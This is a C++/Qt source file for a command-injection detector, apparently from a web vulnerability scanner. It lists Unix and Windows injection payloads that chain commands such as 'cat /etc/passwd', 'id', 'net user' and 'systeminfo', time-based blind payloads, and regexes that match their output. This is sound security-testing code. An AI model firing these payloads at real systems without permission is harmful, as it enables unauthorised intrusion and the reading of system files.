#include "cmdidetector.h"
#include <QRegularExpression>

namespace {

const QStringList unixPayloads = {
    QStringLiteral("; id"),
    QStringLiteral("| id"),
    QStringLiteral("|| id"),
    QStringLiteral("& id"),
    QStringLiteral("&& id"),
    QStringLiteral("`id`"),
    QStringLiteral("$(id)"),
    QStringLiteral("; cat /etc/passwd"),
    QStringLiteral("| cat /etc/passwd"),
    QStringLiteral("`cat /etc/passwd`"),
    QStringLiteral("$(cat /etc/passwd)"),
    QStringLiteral("; ls -la"),
    QStringLiteral("| ls -la"),
    QStringLiteral("; whoami"),
    QStringLiteral("| whoami"),
    QStringLiteral("`whoami`"),
    QStringLiteral("$(whoami)"),
    QStringLiteral("; uname -a"),
    QStringLiteral("| uname -a"),
    QStringLiteral("`uname -a`"),
    QStringLiteral("$(uname -a)"),
    QStringLiteral("; pwd"),
    QStringLiteral("| pwd"),
    QStringLiteral("; echo vulnerable"),
    QStringLiteral("| echo vulnerable"),
    QStringLiteral("`echo vulnerable`"),
    QStringLiteral("$(echo vulnerable)"),
    QStringLiteral("a]|id|"),
    QStringLiteral("a]||id||"),
    QStringLiteral("%0aid"),
    QStringLiteral("%0a/bin/cat%20/etc/passwd"),
    QStringLiteral("\\n/bin/cat /etc/passwd"),
    QStringLiteral("1;netstat -a"),
    QStringLiteral("1|netstat -a")
};

const QStringList windowsPayloads = {
    QStringLiteral("& whoami"),
    QStringLiteral("| whoami"),
    QStringLiteral("&& whoami"),
    QStringLiteral("|| whoami"),
    QStringLiteral("& dir"),
    QStringLiteral("| dir"),
    QStringLiteral("& type C:\\Windows\\win.ini"),
    QStringLiteral("| type C:\\Windows\\win.ini"),
    QStringLiteral("& ipconfig"),
    QStringLiteral("| ipconfig"),
    QStringLiteral("& net user"),
    QStringLiteral("| net user"),
    QStringLiteral("& systeminfo"),
    QStringLiteral("| systeminfo"),
    QStringLiteral("& hostname"),
    QStringLiteral("| hostname"),
    QStringLiteral("& echo vulnerable"),
    QStringLiteral("| echo vulnerable"),
    QStringLiteral("%0awhoami"),
    QStringLiteral("%0adir"),
    QStringLiteral("\\r\\nwhoami"),
    QStringLiteral("1 & whoami"),
    QStringLiteral("1 | whoami"),
    QStringLiteral("| cmd /c whoami"),
    QStringLiteral("& cmd /c whoami")
};

const QStringList unixIdOutputPatterns = {
    QStringLiteral("uid=\\d+\\([^)]+\\)"),
    QStringLiteral("gid=\\d+\\([^)]+\\)"),
    QStringLiteral("groups=\\d+")
};

const QStringList unixPasswdPatterns = {
    QStringLiteral("root:x:0:0:"),
    QStringLiteral("daemon:x:1:1:"),
    QStringLiteral("bin:x:2:2:"),
    QStringLiteral("nobody:x:")
};

const QStringList unixUnamePatterns = {
    QStringLiteral("Linux \\S+ \\d+\\.\\d+"),
    QStringLiteral("Darwin Kernel"),
    QStringLiteral("FreeBSD "),
    QStringLiteral("SunOS ")
};

const QStringList windowsOutputPatterns = {
    QStringLiteral("\\S+\\\\\\S+"),  // domain\username format
    QStringLiteral("Volume Serial Number"),
    QStringLiteral("Directory of "),
    QStringLiteral("Host Name:"),
    QStringLiteral("OS Name:"),
    QStringLiteral("Windows IP Configuration"),
    QStringLiteral("Ethernet adapter"),
    QStringLiteral("IPv4 Address"),
    QStringLiteral("Default Gateway"),
    QStringLiteral("\\[fonts\\]"),
    QStringLiteral("\\[extensions\\]")
};

bool matchesAnyPattern(const QString &text, const QStringList &patterns) {
    for (const QString &pattern : patterns) {
        QRegularExpression re(pattern, QRegularExpression::CaseInsensitiveOption);
        if (re.match(text).hasMatch()) {
            return true;
        }
    }
    return false;
}

} // anonymous namespace


CmdInjectionDetector::OsType CmdInjectionDetector::detectOs(const QString &responseBody) const
{
    if (matchesAnyPattern(responseBody, unixIdOutputPatterns) ||
        matchesAnyPattern(responseBody, unixPasswdPatterns) ||
        matchesAnyPattern(responseBody, unixUnamePatterns)) {
        return OsType::Unix;
    }

    if (matchesAnyPattern(responseBody, windowsOutputPatterns)) {
        return OsType::Windows;
    }

    return OsType::Unknown;
}

CmdInjectionDetector::InjectionType CmdInjectionDetector::detect(const QString &responseBody,
                                                                  const QString &expectedOutput) const
{
    if (responseBody.isEmpty()) {
        return InjectionType::None;
    }

    if (!expectedOutput.isEmpty() && responseBody.contains(expectedOutput, Qt::CaseInsensitive)) {
        if (expectedOutput.contains(QStringLiteral("|"))) {
            return InjectionType::PipeInjection;
        }
        if (expectedOutput.contains(QStringLiteral("`"))) {
            return InjectionType::BacktickInjection;
        }
        if (expectedOutput.contains(QStringLiteral("$("))) {
            return InjectionType::CommandSubstitution;
        }
        return InjectionType::CommandChaining;
    }

    if (matchesAnyPattern(responseBody, unixIdOutputPatterns) ||
        matchesAnyPattern(responseBody, unixPasswdPatterns)) {
        return InjectionType::CommandChaining;
    }

    if (matchesAnyPattern(responseBody, windowsOutputPatterns)) {
        return InjectionType::CommandChaining;
    }

    return InjectionType::None;
}

bool CmdInjectionDetector::isVulnerable(const QString &responseBody) const
{
    return detect(responseBody, QString()) != InjectionType::None;
}

QStringList CmdInjectionDetector::getPayloads(OsType os)
{
    switch (os) {
    case OsType::Unix:
        return unixPayloads;
    case OsType::Windows:
        return windowsPayloads;
    default:
        QStringList all = unixPayloads;
        all.append(windowsPayloads);
        return all;
    }
}

QStringList CmdInjectionDetector::getTimeBasedPayloads(OsType os, int delaySeconds)
{
    QStringList payloads;
    QString delay = QString::number(delaySeconds);

    if (os == OsType::Unix || os == OsType::Unknown) {
        payloads << QStringLiteral("; sleep %1").arg(delay);
        payloads << QStringLiteral("| sleep %1").arg(delay);
        payloads << QStringLiteral("|| sleep %1").arg(delay);
        payloads << QStringLiteral("& sleep %1").arg(delay);
        payloads << QStringLiteral("&& sleep %1").arg(delay);
        payloads << QStringLiteral("`sleep %1`").arg(delay);
        payloads << QStringLiteral("$(sleep %1)").arg(delay);
        payloads << QStringLiteral("%0asleep%20%1").arg(delay);
    }

    if (os == OsType::Windows || os == OsType::Unknown) {
        payloads << QStringLiteral("& ping -n %1 127.0.0.1").arg(delaySeconds + 1);
        payloads << QStringLiteral("| ping -n %1 127.0.0.1").arg(delaySeconds + 1);
        payloads << QStringLiteral("&& ping -n %1 127.0.0.1").arg(delaySeconds + 1);
        payloads << QStringLiteral("|| ping -n %1 127.0.0.1").arg(delaySeconds + 1);
        payloads << QStringLiteral("& timeout /T %1").arg(delay);
        payloads << QStringLiteral("| timeout /T %1").arg(delay);
    }

    return payloads;
}

int CmdInjectionDetector::severityLevel(InjectionType type)
{
    switch (type) {
    case InjectionType::CommandChaining:
    case InjectionType::CommandSubstitution:
    case InjectionType::PipeInjection:
    case InjectionType::BacktickInjection:
        return 4; // Critical - RCE
    case InjectionType::TimeBasedBlind:
        return 3; // High
    case InjectionType::PathTraversal:
        return 2; // Medium
    default:
        return 0;
    }
}
